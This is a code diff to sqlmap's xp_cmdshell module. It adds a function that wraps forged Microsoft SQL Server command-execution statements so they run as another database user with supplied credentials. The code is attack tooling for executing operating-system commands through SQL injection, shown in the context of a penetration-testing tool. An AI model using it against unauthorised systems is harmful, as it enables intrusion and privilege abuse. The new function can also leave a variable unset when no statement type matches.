@@ -21,6 +21,7 @@ from lib.core.data import logger
 from lib.core.enums import DBMS
 from lib.core.enums import HASHDB_KEYS
 from lib.core.exception import sqlmapUnsupportedFeatureException
+from lib.core.settings import SQL_STATEMENTS
 from lib.core.threads import getCurrentThreadData
 from lib.core.unescaper import unescaper
 from lib.request import inject
@@ -147,6 +148,21 @@ class xp_cmdshell:
         if cmd:
             self.xpCmdshellExecCmd(cmd)
 
+    def xpCmdshellForgeRunAs(self, query):
+        if conf.dCred:
+            for sqlTitle, sqlStatements in SQL_STATEMENTS.items():
+                for sqlStatement in sqlStatements:
+                    if query.lower().startswith(sqlStatement):
+                        sqlType = sqlTitle
+                        break
+
+            if sqlType and "SELECT" not in sqlType:
+                query = "SELECT 1;%s" % query
+
+            query = getSPQLSnippet(DBMS.MSSQL, "run_statement_as_user", USER=conf.dbmsUsername, PASSWORD=conf.dbmsPassword, STATEMENT=query.replace("'", "''"))
+
+        return query
+
     def xpCmdshellForgeCmd(self, cmd):
         self.__randStr = randomStr(lowercase=True)
         self.__cmd = "0x%s" % hexencode(cmd)
@@ -154,7 +170,7 @@ class xp_cmdshell:
         self.__forgedCmd += "SET @%s=%s;" % (self.__randStr, self.__cmd)
         self.__forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self.__randStr)
 
-        return self.__forgedCmd
+        return self.xpCmdshellForgeRunAs(self.__forgedCmd)
 
     def xpCmdshellExecCmd(self, cmd, silent=False):
         cmd = self.xpCmdshellForgeCmd(cmd)
